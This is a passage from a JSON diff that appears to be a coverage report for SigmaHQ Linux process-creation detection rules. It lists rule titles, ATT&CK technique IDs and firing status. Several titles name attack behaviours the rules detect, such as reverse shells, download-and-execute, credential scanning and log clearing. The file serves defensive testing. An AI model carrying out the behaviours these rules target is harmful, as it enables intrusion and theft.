+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "3a716279-c18c-4488-83be-f9ececbfb9fc",
+      "title": "Linux Setgid Capability Set on a Binary via Setcap Utility",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_cap_setgid.yml",
+      "technique_ids": [
+        "T1548",
+        "T1554"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1548"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1548",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "43e26eb5-cd58-48d1-8ce9-a273f5d298d8",
+      "title": "Potential Container Discovery Via Inodes Listing",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_inod_listing.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1082",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "47b3bbd4-1bf7-48cc-84ab-995362aaa75a",
+      "title": "Shell Execution via Git - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_git_shell_execution.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "4b09c71e-4269-4111-9cdd-107d8867f0cc",
+      "title": "Shell Execution via Flock - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_flock_shell_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "4e25af4b-246d-44ea-8563-e42aacab006b",
+      "title": "Potential Xterm Reverse Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_xterm_reverse_shell.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "55e862a8-dd9c-4651-807a-f21fcad56716",
+      "title": "Python One-Liners with Base64 Decoding - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_python_base64_encoded_execution.yml",
+      "technique_ids": [
+        "T1059.006",
+        "T1027.010"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1027",
+        "T1059",
+        "T1059.006"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1027",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.006",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "5cd16c8f-44a6-4654-81e7-a84d6db507d4",
+      "title": "Process Execution From Shared Memory Directory",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_exec_from_dev_shm.yml",
+      "technique_ids": [
+        "T1027.011"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1027"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1027",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "5f1573a7-363b-4114-9208-ad7a61de46eb",
+      "title": "ESXi VM List Discovery Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_vm_discovery.yml",
+      "technique_ids": [
+        "T1033",
+        "T1007",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1007",
+        "T1033",
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1007",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1033",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "6419afd1-3742-47a5-a7e6-b50386cd15f8",
+      "title": "Chmod Targeting Sensitive Directories",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_chmod_targeting_sensitive_directories.yml",
+      "technique_ids": [
+        "T1222.002"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1222.002"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1222.002",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "6adfbf8f-52be-4444-9bac-81b539624146",
+      "title": "Shell Execution via Find - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_find_shell_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "746c86fb-ccda-4816-8997-01386263acc4",
+      "title": "Container Residence Discovery Via Proc Virtual FS",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_container_residence_discovery.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1082",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "7ab8f73a-fcff-428b-84aa-6a5ff7877dea",
+      "title": "Vim GTFOBin Abuse - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_vim_shell_execution.yml",
+      "technique_ids": [
+        "T1059",
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059",
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "7f734ed0-4f47-46c0-837f-6ee62505abd9",
+      "title": "Potential Netcat Reverse Shell Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_netcat_reverse_shell.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "8344c0e5-5783-47cc-9cf9-a0f7fd03e6cf",
+      "title": "Potential Discovery Activity Using Find - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_find_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "8737b7f6-8df3-4bb7-b1da-06019b99b687",
+      "title": "Shell Invocation Via Ssh - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_ssh_shell_execution.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "9691f58d-92c1-4416-8bf3-2edd753ec9cf",
+      "title": "ESXi Admin Permission Assigned To Account Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_permission_change_admin.yml",
+      "technique_ids": [
+        "T1059.012",
+        "T1098"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "9b5de532-a757-4d70-946c-1f3e44f48b4d",
+      "title": "Shell Execution GCC  - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_gcc_shell_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa",
+      "title": "Suspicious Download and Execute Pattern via Curl/Wget",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml",
+      "technique_ids": [
+        "T1059.004",
+        "T1203"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "b28e4eb3-8bbc-4f0c-819f-edfe8e2f25db",
+      "title": "ESXi Account Creation Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_user_account_creation.yml",
+      "technique_ids": [
+        "T1136",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "bb382fd5-b454-47ea-a264-1828e4c766d6",
+      "title": "Shell Invocation via Apt - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_apt_shell_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "c4042d54-110d-45dd-a0e1-05c47822c937",
+      "title": "Python Spawning Pretty TTY Via PTY Module",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_python_pty_spawn.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "cf610c15-ed71-46e1-bdf8-2bd1a99de6c4",
+      "title": "Download File To Potentially Suspicious Directory Via Wget",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_wget_download_suspicious_directory.yml",
+      "technique_ids": [
+        "T1105"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1105"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1105",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d27ab432-2199-483f-a297-03633c05bae6",
+      "title": "OS Architecture Discovery Via Grep",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_grep_os_arch_discovery.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1082",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d292e0af-9a18-420c-9525-ec0ac3936892",
+      "title": "Suspicious Java Children Processes",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_java_children.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d54c2f06-aca9-4e2b-81c9-5317858f4b79",
+      "title": "ESXi VSAN Information Discovery Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml",
+      "technique_ids": [
+        "T1033",
+        "T1007",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1007",
+        "T1033",
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1007",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1033",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d7821ff1-4527-4e33-9f84-d0d57fa2fb66",
+      "title": "Print History File Contents",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_history_recon.yml",
+      "technique_ids": [
+        "T1592.004"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1592.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1592.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d7a650c4-226c-451e-948f-cc490db506aa",
+      "title": "PUA - TruffleHog Execution - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_pua_trufflehog.yml",
+      "technique_ids": [
+        "T1083",
+        "T1552.001"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083",
+        "T1552.001"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1552.001",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "d8d97d51-122d-4cdd-9e2f-01b4b4933530",
+      "title": "Capabilities Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_capa_discovery.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "db1ac3be-f606-4e3a-89e0-9607cbe6b98a",
+      "title": "Capsh Shell Invocation - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_capsh_shell_invocation.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "e2326866-609f-4015-aea9-7ec634e8aa04",
+      "title": "Shell Execution via Rsync - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_rsync_shell_execution.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "e34cfa0c-0a50-4210-9cb3-5632d08eb041",
+      "title": "Potential GobRAT File Discovery Via Grep",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_malware_gobrat_grep_payload_discovery.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1082",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "e4ffe466-6ff8-48d4-94bd-e32d1a6061e2",
+      "title": "Nohup Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_nohup.yml",
+      "technique_ids": [
+        "T1059.004"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "e80273e1-9faf-40bc-bd85-dbaff104c4e9",
+      "title": "ESXi System Information Discovery Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_system_discovery.yml",
+      "technique_ids": [
+        "T1033",
+        "T1007",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1007",
+        "T1033",
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1007",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1033",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "ea3ecad2-db86-4a89-ad0b-132a10d2db55",
+      "title": "Interactive Bash Suspicious Children",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_interactive_bash.yml",
+      "technique_ids": [
+        "T1059.004",
+        "T1036"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1036",
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1036",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "f0025a69-e1b7-4dda-a53c-db21fa2d4071",
+      "title": "Script Interpreter Spawning Credential Scanner - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_script_interpretor_spawn_credential_scanner.yml",
+      "technique_ids": [
+        "T1552",
+        "T1005",
+        "T1059.004"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1005",
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1005",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "f41dada5-3f56-4232-8503-3fb7f9cf2d60",
+      "title": "ESXi Storage Information Discovery Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_storage_discovery.yml",
+      "technique_ids": [
+        "T1033",
+        "T1007",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1007",
+        "T1033",
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1007",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1033",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "f8341cb2-ee25-43fa-a975-d8a5a9714b39",
+      "title": "BPFtrace Unsafe Option Usage",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_bpftrace_unsafe_option_usage.yml",
+      "technique_ids": [
+        "T1059.004"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "fe2f9663-41cb-47e2-b954-8a228f3b9dff",
+      "title": "Linux Base64 Encoded Shebang In CLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_base64_shebang_cli.yml",
+      "technique_ids": [
+        "T1140"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1140"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1140",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "0326c3c8-7803-4a0f-8c5c-368f747f7c3e",
+      "title": "Triple Cross eBPF Rootkit Execve Hijack",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_triple_cross_rootkit_execve_hijack.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "11063ec2-de63-4153-935e-b1a8b9e616f1",
+      "title": "Linux Remote System Discovery",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_remote_system_discovery.yml",
+      "technique_ids": [
+        "T1018"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "1f6b8cd4-3e60-47cc-b282-5aa1cbc9182d",
+      "title": "Remote Access Tool - Team Viewer Session Started On Linux Host",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_remote_access_tools_teamviewer_incoming_connection.yml",
+      "technique_ids": [
+        "T1133"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "21541900-27a9-4454-9c4c-3f0a4240344a",
+      "title": "OMIGOD SCX RunAsProvider ExecuteShellCommand",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml",
+      "technique_ids": [
+        "T1068",
+        "T1190",
+        "T1203"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "22236d75-d5a0-4287-bf06-c93b1770860f",
+      "title": "Triple Cross eBPF Rootkit Install Commands",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_triple_cross_rootkit_install.yml",
+      "technique_ids": [
+        "T1014"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "259df6bc-003f-4306-9f54-4ff1a08fa38e",
+      "title": "Potential Perl Reverse Shell Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_perl_reverse_shell.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "2fade0b6-7423-4835-9d4f-335b39b83867",
+      "title": "Shell Execution Of Process Located In Tmp Directory",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "30bcce26-51c5-49f2-99c8-7b59e3af36c7",
+      "title": "Execution Of Script Located In Potentially Suspicious Directory",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "32e62bc7-3de0-4bb1-90af-532978fe42c0",
+      "title": "Python Reverse Shell Execution Via PTY And Socket Modules",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_python_reverse_shell.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "36388120-b3f1-4ce9-b50b-280d9a7f4c04",
+      "title": "Kaspersky Endpoint Security Stopped Via CommandLine - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_av_kaspersky_av_disabled.yml",
+      "technique_ids": [
+        "T1685"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "3be619f4-d9ec-4ea8-a173-18fdd01996ab",
+      "title": "Flush Iptables Ufw Chain",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_iptables_flush_ufw.yml",
+      "technique_ids": [
+        "T1686"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "3e102cd9-a70d-4a7a-9508-403963092f31",
+      "title": "Linux Network Service Scanning Tools Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_network_utilities_execution.yml",
+      "technique_ids": [
+        "T1046"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "3fcc9b35-39e4-44c0-a2ad-9e82b6902b31",
+      "title": "Syslog Clearing or Removal Via System Utilities",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_clear_syslog.yml",
+      "technique_ids": [
+        "T1685.006"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "457df417-8b9d-4912-85f3-9dbda39c3645",
+      "title": "Suspicious Nohup Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_nohup_susp_execution.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "6104e693-a7d6-4891-86cb-49a258523559",
+      "title": "Bash Interactive Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_bash_interactive_shell.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "6a50f16c-3b7b-42d1-b081-0fdd3ba70a73",
+      "title": "User Added To Root/Sudoers Group Using Usermod",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_usermod_susp_group.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "6eea1bf6-f8d2-488a-a742-e6ef6c1b67db",
+      "title": "OMIGOD SCX RunAsProvider ExecuteScript",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_omigod_scx_runasprovider_executescript.yml",
+      "technique_ids": [
+        "T1068",
+        "T1190",
+        "T1203"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "700fb7e8-2981-401c-8430-be58e189e741",
+      "title": "Suspicious Package Installed - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_install_suspicious_packages.yml",
+      "technique_ids": [
+        "T1553.004"
+      ],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "7692f583-bd30-4008-8615-75dab3f08a99",
+      "title": "Enable BPF Kprobes Tracing",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_bpf_kprob_tracing_enabled.yml",
+      "technique_ids": [],
+      "status": "out_of_corpus",
+      "in_corpus_techniques": [],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
